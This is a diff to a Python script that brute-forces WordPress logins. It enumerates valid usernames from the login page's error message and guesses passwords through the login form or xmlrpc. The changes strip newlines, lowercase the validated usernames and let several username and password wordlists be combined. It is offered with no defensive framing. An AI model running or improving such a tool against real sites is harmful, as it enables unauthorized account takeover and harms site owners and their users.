@@ -75,6 +75,7 @@ def login_form(u_list, p_list, u_len, p_len, uname_len, pname_len):
 def validated_user(u_list):
     tmp = []
     for user in u_list:
+        user = user.replace('\n','')
         data = {
             'log':user,
             'pwd':'p@assword',
@@ -83,8 +84,8 @@ def validated_user(u_list):
         try:
             r = s.post(args.url+'/wp-login.php', headers=HEADER, data=data, verify=False)
             if 'The password you entered for the username' in r.text:
-                tmp.append(user.replace('\n',''))
-                print(f'\t- {user}')
+                tmp.append(user.lower())
+                print(f'\t- {user.lower()}')
         except Exception as e:
             print(f'User validation Failed : {e}')
             exit(-1)
@@ -138,10 +139,10 @@ if __name__ == '__main__':
     group_user = parser.add_mutually_exclusive_group(required=True)
     group_password = parser.add_mutually_exclusive_group(required=True)
     parser.add_argument('--url', required=True, type=str, help='Target WordPress Url')
-    group_user.add_argument('-u', '--userlist', type=str, help='List with Usernames')
-    group_user.add_argument('-U', '--user', nargs='+', type=str, help='Individual Usernames')
-    group_password.add_argument('-p', '--passwordlist', type=str, help='List with Passwords')
-    group_password.add_argument('-P', '--password', nargs='+', type=str, help='Individual Passwords')
+    group_user.add_argument('-u', '--userlist', nargs='+', default=[], type=str, help='List with Usernames')
+    group_user.add_argument('-U', '--user', nargs='+', default=[], type=str, help='Individual Usernames')
+    group_password.add_argument('-p', '--passwordlist', nargs='+', default=[], type=str, help='List with Passwords')
+    group_password.add_argument('-P', '--password', nargs='+', default=[], type=str, help='Individual Passwords')
     parser.add_argument('-m', '--methode', choices=['x','xmlrpc','l','loginForm'], type=str, default='loginpage', help='Choose x=xmlrpc or l=loginForm (loginForm=Default)')
     parser.add_argument('-o', '--output', nargs='?', default=None, const='find_creds.out')
     parser.add_argument('-v', '--validated', action='store_true', default=False, help='Validate username via Login Error')
@@ -151,12 +152,13 @@ if __name__ == '__main__':
     s = requests.session()
 
     u_list = args.user
-    if args.userlist:
-        f = open(args.userlist,"r")
-        u_list = f.readlines()
+    for user_list in args.userlist:
+        f = open(user_list,"r")
+        u_list += f.readlines()
     p_list = args.password
-    if args.passwordlist:
-        f = open(args.passwordlist,"r")
-        p_list = f.readlines()
+    for pw_list in args.passwordlist:
+        if args.passwordlist:
+            f = open(pw_list,"r")
+            p_list += f.readlines()
 
     main(u_list, p_list)
